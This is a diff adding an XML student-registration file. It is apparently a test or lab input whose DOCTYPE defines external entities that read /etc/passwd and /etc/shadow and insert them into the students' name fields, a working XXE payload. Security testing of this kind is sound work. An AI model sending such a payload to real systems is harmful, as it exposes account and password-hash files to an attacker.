@@ -1,0 +1,29 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE registration [
+	<!ENTITY bcode SYSTEM "file:///etc/passwd">
+	<!ENTITY bcode2 SYSTEM "file:///etc/shadow">
+]>
+<registration>
+  <student>
+    <name>
+      <first>&bcode;</first>
+      <last>Idiot</last>
+    </name>
+    <email>idiot@hacking.de</email>
+  </student>
+  <student>
+    <name>
+      <first>&bcode2;</first>
+      <last>Idiot2</last>
+    </name>
+    <email>idiot@hacking2.de</email>
+  </student>
+  <student>
+    <name>
+      <first>test</first>
+      <last>Idiot3</last>
+    </name>
+    <email>idiot@hacking3.de</email>
+  </student>
+</registration>
+
